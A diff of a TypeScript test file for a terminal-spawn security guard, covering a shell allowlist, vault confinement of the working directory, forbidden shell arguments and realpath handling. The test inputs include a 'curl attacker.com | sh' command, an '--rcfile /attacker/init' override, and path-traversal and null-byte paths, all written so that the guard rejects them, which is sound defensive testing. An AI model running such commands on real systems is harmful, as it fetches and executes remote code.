@@ -13,6 +13,7 @@
 
 import { describe, it, expect, beforeEach, afterEach } from 'vitest'
 import fs from 'node:fs/promises'
+import { realpathSync } from 'node:fs'
 import path from 'node:path'
 import os from 'node:os'
 
@@ -40,7 +41,9 @@ async function teardown(): Promise<void> {
   await fs.rm(vault, { recursive: true, force: true })
 }
 
-function opts(overrides: Partial<PtySpawnOpts> & Pick<PtySpawnOpts, 'shell' | 'cwd'>): PtySpawnOpts {
+function opts(
+  overrides: Partial<PtySpawnOpts> & Pick<PtySpawnOpts, 'shell' | 'cwd'>
+): PtySpawnOpts {
   return {
     id: 'test-id',
     cols: 80,
@@ -49,6 +52,16 @@ function opts(overrides: Partial<PtySpawnOpts> & Pick<PtySpawnOpts, 'shell' | 'c
     ...overrides,
   }
 }
+
+// A generic shell guaranteed to exist AND resolve into the guard's allowlist on
+// both macOS (realpath → /bin/bash) and Ubuntu CI (/bin → /usr/bin symlink,
+// realpath → /usr/bin/bash). /bin/sh resolves to dash and /bin/zsh is absent on
+// Ubuntu, so neither can stand in for a valid generic shell in cross-platform CI.
+const GENERIC_SHELL = '/bin/bash'
+
+// The guard returns the realpath of the shell, which differs from the input on
+// Linux (/bin/bash → /usr/bin/bash). Happy-path assertions compare against this.
+const genericShellReal = realpathSync(GENERIC_SHELL)
 
 // ---------------------------------------------------------------------------
 // 1. Shell not in allowlist → MARVIN_SHELL_NOT_ALLOWED
@@ -89,9 +102,9 @@ describe('pty:spawn — shell allowlist', () => {
   })
 
   it('rejects empty string as shell', async () => {
-    await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '', cwd: vault }))
-    ).rejects.toThrow('MARVIN_SHELL_NOT_ALLOWED')
+    await expect(assertPtySpawnAllowed(vault, opts({ shell: '', cwd: vault }))).rejects.toThrow(
+      'MARVIN_SHELL_NOT_ALLOWED'
+    )
   })
 })
 
@@ -105,34 +118,34 @@ describe('pty:spawn — cwd must be inside vault', () => {
 
   it('rejects cwd=/etc — absolute path outside vault', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: '/etc' }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: '/etc' }))
     ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
   })
 
   it('rejects cwd=/ — filesystem root', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: '/' }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: '/' }))
     ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
   })
 
   it('rejects cwd=<vault>/../escape — path traversal', async () => {
     const traversal = path.join(vault, '..', 'escape')
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: traversal }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: traversal }))
     ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
   })
 
   it('rejects cwd=<vault>/sub/../../escape — deep traversal', async () => {
     const traversal = path.join(vault, 'sub', '..', '..', 'escape')
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: traversal }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: traversal }))
     ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
   })
 
   it('rejects cwd with null byte', async () => {
     const nullCwd = vault + '\0evil'
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: nullCwd }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: nullCwd }))
     ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
   })
 
@@ -143,7 +156,7 @@ describe('pty:spawn — cwd must be inside vault', () => {
       await fs.symlink(outside, symlinkCwd)
 
       await expect(
-        assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: symlinkCwd }))
+        assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: symlinkCwd }))
       ).rejects.toThrow('MARVIN_OUTSIDE_VAULT')
     } finally {
       await fs.rm(outside, { recursive: true, force: true })
@@ -159,27 +172,39 @@ describe('pty:spawn — args sanitization for generic shells', () => {
   beforeEach(setup)
   afterEach(teardown)
 
-  it('rejects /bin/sh with args [-c, echo pwn]', async () => {
+  it('rejects a generic shell with args [-c, echo pwn]', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault, args: ['-c', 'echo pwn'] }))
+      assertPtySpawnAllowed(
+        vault,
+        opts({ shell: GENERIC_SHELL, cwd: vault, args: ['-c', 'echo pwn'] })
+      )
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 
   it('rejects /bin/bash with args [-c, curl attacker.com | sh]', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['-c', 'curl attacker.com | sh'] }))
+      assertPtySpawnAllowed(
+        vault,
+        opts({ shell: '/bin/bash', cwd: vault, args: ['-c', 'curl attacker.com | sh'] })
+      )
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 
-  it('rejects /bin/zsh with args [-c, malicious]', async () => {
+  it('rejects a generic shell with args [-c, malicious]', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault, args: ['-c', 'malicious'] }))
+      assertPtySpawnAllowed(
+        vault,
+        opts({ shell: GENERIC_SHELL, cwd: vault, args: ['-c', 'malicious'] })
+      )
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 
   it('rejects -c as first arg even with trailing args', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault, args: ['-c', 'cmd', 'extra'] }))
+      assertPtySpawnAllowed(
+        vault,
+        opts({ shell: GENERIC_SHELL, cwd: vault, args: ['-c', 'cmd', 'extra'] })
+      )
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 })
@@ -192,31 +217,26 @@ describe('pty:spawn — happy path: allowed shells in vault', () => {
   beforeEach(setup)
   afterEach(teardown)
 
-  it('accepts /bin/zsh with empty args inside vault — returns {shell, cwd}', async () => {
-    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault }))
-    expect(result).toMatchObject({ shell: '/bin/zsh' })
+  it('accepts a generic shell with empty args inside vault — returns {shell, cwd}', async () => {
+    const result = await assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: vault }))
+    expect(result).toMatchObject({ shell: genericShellReal })
   })
 
-  it('accepts /bin/bash with empty args inside vault', async () => {
-    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault }))
-    expect(result).toMatchObject({ shell: '/bin/bash' })
-  })
-
-  it('accepts /bin/sh with empty args inside vault', async () => {
-    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault }))
-    expect(result).toMatchObject({ shell: '/bin/sh' })
+  it('returns the realpath of the shell, not the input path', async () => {
+    const result = await assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: vault }))
+    expect(result.shell).toBe(await fs.realpath(GENERIC_SHELL))
   })
 
   it('accepts cwd that is a subdirectory of the vault', async () => {
     const subdir = path.join(vault, 'project', 'src')
     await fs.mkdir(subdir, { recursive: true })
 
-    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: subdir }))
-    expect(result).toMatchObject({ shell: '/bin/zsh' })
+    const result = await assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: subdir }))
+    expect(result).toMatchObject({ shell: genericShellReal })
   })
 
   it('returned cwd is realpath-resolved (not lexical)', async () => {
-    const result = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault }))
+    const result = await assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: vault }))
     const expected = await fs.realpath(vault)
     expect(result.cwd).toBe(expected)
   })
@@ -296,25 +316,31 @@ describe('pty:spawn — HIGH-1: all args rejected for generic shells', () => {
 
   it('rejects args: [-ic] — combined interactive+exec flags', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/zsh', cwd: vault, args: ['-ic'] }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: vault, args: ['-ic'] }))
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 
   it('rejects args: [-s] — reads script from stdin', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: vault, args: ['-s'] }))
+      assertPtySpawnAllowed(vault, opts({ shell: GENERIC_SHELL, cwd: vault, args: ['-s'] }))
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 
   it('rejects args: [/some/script.sh] — positional script path', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['/some/script.sh'] }))
+      assertPtySpawnAllowed(
+        vault,
+        opts({ shell: '/bin/bash', cwd: vault, args: ['/some/script.sh'] })
+      )
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 
   it('rejects args: [--rcfile, /path] — bash init file override', async () => {
     await expect(
-      assertPtySpawnAllowed(vault, opts({ shell: '/bin/bash', cwd: vault, args: ['--rcfile', '/attacker/init'] }))
+      assertPtySpawnAllowed(
+        vault,
+        opts({ shell: '/bin/bash', cwd: vault, args: ['--rcfile', '/attacker/init'] })
+      )
     ).rejects.toThrow('MARVIN_SHELL_ARGS_FORBIDDEN')
   })
 })
@@ -375,7 +401,10 @@ describe('HIGH-NEW: registerDynamicShell stores realpath, not symlink path', () 
         // but must store realpathSync(symlink) so the fs.realpath lookup matches.
         registerDynamicShell(symlink)
 
-        const result = await assertPtySpawnAllowed(vault2, opts({ shell: symlink, cwd: vault2, args: [] }))
+        const result = await assertPtySpawnAllowed(
+          vault2,
+          opts({ shell: symlink, cwd: vault2, args: [] })
+        )
         expect(result.shell).toBe(await fs.realpath(symlink))
       } finally {
         await fs.rm(vaultDir, { recursive: true, force: true })
@@ -396,7 +425,8 @@ describe('HIGH-NEW: registerDetectedAgent stores realpath, not symlink path', ()
       const symlink = path.join(tmpDir, 'codex-symlink')
       await fs.symlink(realBin, symlink)
 
-      const { registerDetectedAgent, getDynamicShells: getShells } = await import('../agent-detect-guard.js')
+      const { registerDetectedAgent, getDynamicShells: getShells } =
+        await import('../agent-detect-guard.js')
       registerDetectedAgent(symlink)
 
       const expected = await fs.realpath(symlink)
@@ -449,7 +479,11 @@ describe('CRITICAL-1: agent:detect — name allowlist', () => {
 describe('CRITICAL-1: agent:detect — dynamicShells not poisoned on rejection', () => {
   it('dynamicShells does not contain /usr/bin/python3 after rejected detect attempt', () => {
     // Attempting to detect a non-allowed name must not add anything to dynamicShells.
-    try { assertAgentDetectAllowed('python3') } catch { /* expected */ }
+    try {
+      assertAgentDetectAllowed('python3')
+    } catch {
+      /* expected */
+    }
     const shells = getDynamicShells()
     const poisoned = [...shells].some((s) => s.includes('python'))
     expect(poisoned).toBe(false)
@@ -472,8 +506,9 @@ describe('MEDIUM: error messages do not leak shell paths', () => {
 
   it('MARVIN_SHELL_NOT_ALLOWED message does not contain the rejected shell path', async () => {
     const evilShell = '/usr/bin/python3'
-    const err = await assertPtySpawnAllowed(vault, opts({ shell: evilShell, cwd: vault }))
-      .catch((e: Error) => e)
+    const err = await assertPtySpawnAllowed(vault, opts({ shell: evilShell, cwd: vault })).catch(
+      (e: Error) => e
+    )
     expect(err).toBeInstanceOf(Error)
     expect((err as Error).message).not.toContain(evilShell)
     expect((err as Error).message).toBe('MARVIN_SHELL_NOT_ALLOWED')
@@ -481,8 +516,10 @@ describe('MEDIUM: error messages do not leak shell paths', () => {
 
   it('MARVIN_OUTSIDE_VAULT message does not contain the rejected cwd path', async () => {
     const evilCwd = '/etc/sensitive'
-    const err = await assertPtySpawnAllowed(vault, opts({ shell: '/bin/sh', cwd: evilCwd }))
-      .catch((e: Error) => e)
+    const err = await assertPtySpawnAllowed(
+      vault,
+      opts({ shell: GENERIC_SHELL, cwd: evilCwd })
+    ).catch((e: Error) => e)
     expect(err).toBeInstanceOf(Error)
     expect((err as Error).message).not.toContain(evilCwd)
     expect((err as Error).message).toBe('MARVIN_OUTSIDE_VAULT')
